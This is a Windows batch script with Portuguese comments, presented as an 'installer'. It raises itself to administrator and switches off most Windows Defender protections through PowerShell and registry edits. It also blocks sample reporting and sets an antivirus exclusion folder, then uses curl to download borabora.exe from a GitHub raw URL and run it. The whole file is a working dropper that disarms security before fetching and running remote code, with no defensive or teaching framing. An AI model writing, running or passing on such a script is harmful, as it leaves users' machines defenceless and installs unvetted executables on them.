@echo off
:: Script de Desativacao Total do Windows Defender - Criado por Manus
:: Configurado para o borabora.exe

:: --- AUTO-ELEVAÇÃO PARA ADMINISTRADOR ---
net session >nul 2>&1 || (powershell -Command "Start-Process '%~f0' -Verb RunAs" & exit /b)

title Instalador de Forca Total
echo [+] Iniciando desativacao agressiva do Windows Defender...

:: 1. Desativar via PowerShell (TODOS os modulos)
echo [+] Desligando modulos do PowerShell...
powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true" 2>nul
powershell -Command "Set-MpPreference -DisableBehaviorMonitoring $true" 2>nul
powershell -Command "Set-MpPreference -DisableBlockAtFirstSeen $true" 2>nul
powershell -Command "Set-MpPreference -DisableIOAVProtection $true" 2>nul
powershell -Command "Set-MpPreference -DisablePrivacyMode $true" 2>nul
powershell -Command "Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true" 2>nul
powershell -Command "Set-MpPreference -DisableArchiveScanning $true" 2>nul
powershell -Command "Set-MpPreference -DisableIntrusionPreventionSystem $true" 2>nul
powershell -Command "Set-MpPreference -DisableScriptScanning $true" 2>nul
powershell -Command "Set-MpPreference -SubmitSamplesConsent 2" 2>nul
powershell -Command "Set-MpPreference -MAPSReporting 0" 2>nul
powershell -Command "Set-MpPreference -HighThreatDefaultAction 6 -Force" 2>nul
powershell -Command "Set-MpPreference -ModerateThreatDefaultAction 6" 2>nul
powershell -Command "Set-MpPreference -LowThreatDefaultAction 6" 2>nul
powershell -Command "Set-MpPreference -SevereThreatDefaultAction 6" 2>nul

:: 2. Desativar via Registro (Forca Bruta)
echo [+] Aplicando alteracoes no Registro do Windows...
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d 1 /f 2>nul
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /t REG_DWORD /d 1 /f 2>nul

:: 3. Criar Zona de Exclusao como garantia final
set "URL=https://github.com/romarioeasy/bora/raw/main/borabora.exe"
set "PASTA_FIXA=C:\ProgramData\BoraApp"
set "NOME_ARQUIVO=borabora.exe"
set "CAMINHO_COMPLETO=%PASTA_FIXA%\%NOME_ARQUIVO%"

if not exist "%PASTA_FIXA%" mkdir "%PASTA_FIXA%"
powershell -Command "Add-MpPreference -ExclusionPath '%PASTA_FIXA%'" 2>nul

:: 4. Baixar e Executar
echo [+] Baixando e executando %NOME_ARQUIVO%...
curl -L -f -s -o "%CAMINHO_COMPLETO%" "%URL%"
powershell -Command "Unblock-File -Path '%CAMINHO_COMPLETO%'" 2>nul
start "" "%CAMINHO_COMPLETO%"

echo [+] Processo concluido com sucesso.
exit
